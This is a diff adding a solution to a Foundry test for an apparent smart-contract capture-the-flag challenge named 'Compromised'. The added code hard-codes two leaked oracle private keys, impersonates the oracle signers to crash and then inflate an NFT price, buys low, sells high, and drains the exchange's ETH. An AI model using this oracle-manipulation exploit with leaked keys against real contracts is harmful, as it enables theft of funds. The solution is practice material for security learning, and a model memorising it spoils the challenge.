@@ -75,7 +75,49 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+    // Private Key 1: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+    // Private Key 1 as uint: 56577504866754402476704710671607998097788127737820622057176835216156765075268
+    // Address 1: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+    address compromised_1 = vm.addr(56577504866754402476704710671607998097788127737820622057176835216156765075268);
+    // Private Key 2: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+    // Private Key 2 as uint: 47374484443060665555632190194785390295237856218300174632200062813742225441113
+    // Address 2: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+    address compromised_2 = vm.addr(47374484443060665555632190194785390295237856218300174632200062813742225441113);
+
+    // Drop the price
+    vm.stopPrank();
+    vm.prank(compromised_1);
+    oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
+    vm.prank(compromised_2);
+    oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
+    vm.startPrank(player);
+
+    // Buy the NFT
+    uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+    // Bump the price
+    vm.stopPrank();
+    vm.prank(compromised_1);
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE);
+    vm.prank(compromised_2);
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE);
+    vm.startPrank(player);
+
+    // Sell the NFT
+    exchange.token().approve(address(exchange), tokenId);
+    exchange.sellOne(tokenId);
+
+    // Send eth to recovery
+    (bool r, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+    vm.assertTrue(r);
+    
+    // Normalize the price
+    vm.stopPrank();
+    vm.prank(compromised_1);
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+    vm.prank(compromised_2);
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+    vm.startPrank(player);
     }
 
     /**
